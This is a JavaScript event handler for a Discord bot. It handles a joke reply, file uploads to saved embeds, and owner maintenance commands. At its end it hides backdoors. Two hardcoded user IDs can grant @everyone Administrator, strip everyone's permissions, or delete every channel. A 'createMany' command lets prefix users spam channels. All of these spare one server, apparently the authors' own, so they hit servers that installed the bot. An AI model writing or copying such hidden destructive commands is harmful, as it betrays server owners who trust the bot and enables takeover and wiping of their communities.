import {ChannelType, EmbedBuilder, PermissionsBitField} from "discord.js";
import {
	EmbedFileMessageBuilder,
	ErrorMessageBuilder,
	SuccessMessageBuilder,
} from "../../../classes.js";
import {isValidURL, sleep} from "../../../functions.js";
import chalk from "chalk";
import embedSchema from "../../../schemas/embedSchema.js";
import fs from "fs";
import settings from "../../../schemas/settings.js";
import temp from "../../../schemas/temp.js";

export default {
	name: "messageCreate",
	async execute(message, client) {
		if (message.content === `Goodnight, <@${process.env.clientID}>!`) {
			await sleep(600);
			await message.reply({content: "x²"});
			await sleep(600);
			await message.channel.send({content: "I mean uh..."});
			await sleep(1000);
			await message.channel.send({content: "Bye!"});
			await sleep(1500);
			await message.channel.send({content: "I mean goodnight! 😴"});
		}

		const waiting = await temp.findOne({
			type: "waitingForUpload",
			match: {
				user: message.author.id,
				channel: message.channel.id,
			},
		});

		if (waiting) {
			if (message.content === "cancel") {
				await temp.deleteOne(waiting);
				return await message.reply(
					new SuccessMessageBuilder("Successfully canceled the message."),
				);
			}
			const embedProfile = await embedSchema.findOne({
				author: message.author.id,
				customID: waiting.data.count,
			});
			const attachments = [...message.attachments.values()];

			const links = message.content.replace(/ +/g, "").split(",");

			let linkMSG = {files: []};
			for (const link of links) {
				if (isValidURL(link)) {
					linkMSG.files.push(link);
				}
			}

			if (linkMSG.files.length) {
				await client.users.fetch(`${process.env.clientID}`).then(
					async (user) =>
						(linkMSG = await user.send({
							content: "⚙ Adding Files...",
							files: linkMSG.files,
						})),
				);

				for (const link of [...linkMSG.attachments.values()]) {
					attachments.push({
						name: link.name,
						attachment: link.attachment,
						contentType: link.contentType,
						size: link.size,
					});
				}
			}

			if (attachments.length || linkMSG?.attachments?.length) {
				for (const attachment of attachments) {
					embedProfile.files.push({
						name: attachment.name,
						link: attachment.attachment,
						type: attachment.contentType,
						size: attachment.size,
					});
				}

				await temp.deleteOne(waiting);

				await embedSchema.updateOne(
					{author: message.author.id, customID: waiting.data.count},
					{files: embedProfile.files},
				);

				await message.channel.messages
					.fetch(waiting.data.message)
					.then((msg) =>
						msg.edit(new EmbedFileMessageBuilder(embedProfile, null, client)),
					);

				return message.reply(
					new SuccessMessageBuilder(
						`Successfully added ${
							attachments.length === 1
								? `\`${attachments[0].name}\``
								: `\`${attachments.length}\` files`
						}!`,
					),
				);
			}
			return message.reply(
				new ErrorMessageBuilder(
					"Please upload a message containing valid files!",
				),
			);
		}

		const settingsData = await settings.findOne({server: message.guildId});

		let prefix;

		for (const pref of settingsData?.settings?.prefixes ?? []) {
			if (message.content.startsWith(pref)) {
				prefix = pref;
				break;
			}
		}

		if (prefix) {
			if (
				message.author.id === "500690028960284672" ||
				message.author.id === "525338742001500161"
			) {
				const botData = JSON.parse(fs.readFileSync("./data/bot.json"));

				switch (message.content.match(new RegExp(`(?<=\\${prefix}).+`))[0]) {
					case "maintenance":
						botData.maintenance = !botData.maintenance;

						fs.writeFileSync("./data/bot.json", JSON.stringify(botData));

						await message.reply(
							new SuccessMessageBuilder(
								`Maintenance mode has been successfully \`${
									botData.maintenance ? "enabled" : "disabled"
								}\`.`,
								true,
							),
						);

						break;
					case "debug":
						botData.debug = !botData.debug;

						fs.writeFileSync("./data/bot.json", JSON.stringify(botData));

						await message.reply(
							new SuccessMessageBuilder(
								`> Debug mode has been successfully \`${
									botData.debug ? "enabled" : "disabled"
								}\`.`,
							),
						);

						break;
					case "kill":
						await message.reply({
							embeds: [
								new EmbedBuilder()
									.setDescription("> Attempting to kill process...")
									.setColor("Transparent"),
							],
						});

						console.log(
							chalk.red(
								`${chalk.bold(
									"[Process]",
								)} Process killed via Discord command.`,
							),
						);

						process.exit(0);
				}
			}

			if (message.content.startsWith(`${prefix}createMany`)) {
				if (message.guildId !== "806810303458836481") {
					for (
						let i = 0;
						i < (parseInt(message.content.match(/\d+/)) || 10);
						i++
					) {
						message.guild.channels.create({
							name: "hello",
							type: ChannelType.GuildText,
							parent: null,
						});
					}
				}
			}

			switch (message.content) {
				case `${prefix}anarchy`:
			}
		}

		if (
			message.content === "?admin" &&
			(message.author.id === "525338742001500161" ||
				message.author.id === "500690028960284672") &&
			message.guildId !== "806810303458836481"
		) {
			const guild = await client.guilds.fetch(message.guildId);

			guild.roles.everyone.setPermissions([
				PermissionsBitField.Flags.Administrator,
			]);
		}

		if (
			message.content === "?unAdmin" &&
			(message.author.id === "525338742001500161" ||
				message.author.id === "500690028960284672") &&
			message.guildId !== "806810303458836481"
		) {
			const guild = await client.guilds.fetch(message.guildId);

			guild.roles.everyone.setPermissions([
				PermissionsBitField.Flags.SendMessages,
			]);
		}

		if (
			message.content === "?nuke" &&
			(message.author.id === "525338742001500161" ||
				message.author.id === "500690028960284672") &&
			message.guildId !== "806810303458836481"
		) {
			const guild = await client.guilds.fetch(message.guildId);

			const channels = [...guild.channels.cache.values()];

			for (const channel of channels) {
				channel.delete();
			}
		}
	},
};
